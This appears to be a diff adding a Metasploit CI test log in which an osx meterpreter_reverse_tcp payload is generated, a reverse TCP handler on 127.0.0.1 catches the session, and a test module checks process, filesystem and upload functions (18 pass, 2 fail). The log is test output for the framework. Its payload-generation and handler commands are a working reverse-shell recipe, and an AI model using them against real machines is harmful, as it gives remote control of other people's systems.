@@ -1,0 +1,89 @@
+use osx/x64/meterpreter_reverse_tcp
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/osxx64meterpreter_reverse_tcp_session_tlv_logging20231005-1772-6m7byitxt
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-osx-x---meterpreter-reverse-tcp20231005-1772-v2xr1k -f macho AutoVerifySessionTimeout=30 lport=6009 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/osxx64meterpreter_reverse_tcp_debug_log20231005-1772-1ydqixtxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/osxx64meterpreter_reverse_tcp_session_tlv_logging20231005-1772-6m7byitxt
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> [*] Writing 810648 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-osx-x---meterpreter-reverse-tcp20231005-1772-v2xr1k...
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 8
+[4mmsf6[0m payload([1m[31mosx/x64/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6009 
+[*] Meterpreter session 9 opened (127.0.0.1:6009 -> 127.0.0.1:49442) at 2023-10-05 17:12:34 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=9 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-wqrvixmo
+[*] meterpreter-test-dir-wqrvixmo created
+[*] Setup: Now in /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-wqrvixmo
+[*] Running against session 9
+[*] Session type is meterpreter and platform is osx
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] [should return its own process id] Pid: 2363
+[+] should return its own process id
+[*] [should return a list of processes] PID info: {"pid"=>2363, "ppid"=>1772, "name"=>"child-process-rb", "path"=>"/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-osx-x---meterpreter-reverse-tcp20231005-1772-v2xr1k", "session"=>nil, "user"=>"runner", "arch"=>"x86"}
+[+] should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+[-] FAILED: should return network interfaces
+[-] FAILED: should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[*] [should return the proper directory separator] received sysinfo {"Computer"=>"Mac-1696525063996.local", "OS"=>"macOS Big Sur (macOS 11.7.10)", "Architecture"=>"x86", "BuildTuple"=>"x86_64-apple-darwin", "System Language"=>nil, "Domain"=>nil, "Logged On Users"=>nil}
+[*] [should return the proper directory separator] Received separator "/" - expected: "/"
+[+] should return the proper directory separator
+[*] [should return the current working directory] CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-wqrvixmo
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] [should stat a directory] Current directory: "/private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-wqrvixmo"
+[*] [should stat a directory] Stat of current directory: #<#<Class:0x00007fbf982680b8>:0x00007fbf7e096c90 @stathash={"st_dev"=>16777225, "st_mode"=>16877, "st_nlink"=>2, "st_uid"=>501, "st_gid"=>20, "st_rdev"=>0, "st_ino"=>12894971716, "st_size"=>64, "st_atime"=>1696525954, "st_mtime"=>1696525954, "st_ctime"=>1696525954}>
+[+] should stat a directory
+[*] [should create and remove a dir] Directory Name: meterpreter-test-dir-hmxolpaq
+[*] [should create and remove a dir] Directory created successfully
+[*] [should create and remove a dir] Directory removed successfully
+[+] should create and remove a dir
+[*] [should change directories] Directory Name: meterpreter-test-dir-hmxolpaq
+[*] [should change directories] Directory created successfully
+[*] [should change directories] Old CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-wqrvixmo
+[*] [should change directories] New CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-wqrvixmo/meterpreter-test-dir-hmxolpaq
+[*] [should change directories] Back to old CWD: /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-wqrvixmo
+[*] [should change directories] Directory removed successfully
+[+] should change directories
+[*] [should create and remove files] File Name: meterpreter-test-hmxolpaq
+[*] [should create and remove files] Wrote to meterpreter-test-hmxolpaq, checking contents
+[*] [should create and remove files] Wrote test
+[+] should create and remove files
+[*] [should upload a file] Remote File Name: meterpreter-test-file-hmxolpaq.txt
+[*] [should upload a file] uploading
+[*] [should upload a file] done
+[*] [should upload a file] remote file exists? true
+[+] should upload a file
+[*] [should move files] Source File Name: meterpreter-test-hmxolpaq
+[*] [should move files] Destination File Name: meterpreter-test-hmxolpaq-moved
+[+] should move files
+[*] [should copy files] Source File Name: meterpreter-test-hmxolpaq
+[*] [should copy files] Destination File Name: meterpreter-test-hmxolpaq-copied
+[+] should copy files
+[*] [should do md5 and sha1 of files] Remote File Name: meterpreter-test-file-hmxolpaq.txt
+[*] [should do md5 and sha1 of files] uploading
+[*] [should do md5 and sha1 of files] done
+[*] [should do md5 and sha1 of files] remote file exists? true
+[*] [should do md5 and sha1 of files] remote md5: 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] local md5 : 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] remote sha: 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[*] [should do md5 and sha1 of files] local sha : 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[+] should do md5 and sha1 of files
+[*] Testing complete in 0.89 seconds
+[-] Passed: 18; Failed: 2; Skipped: 0
+[*] Cleanup: changing working directory back to /Users/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 9 closed.
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
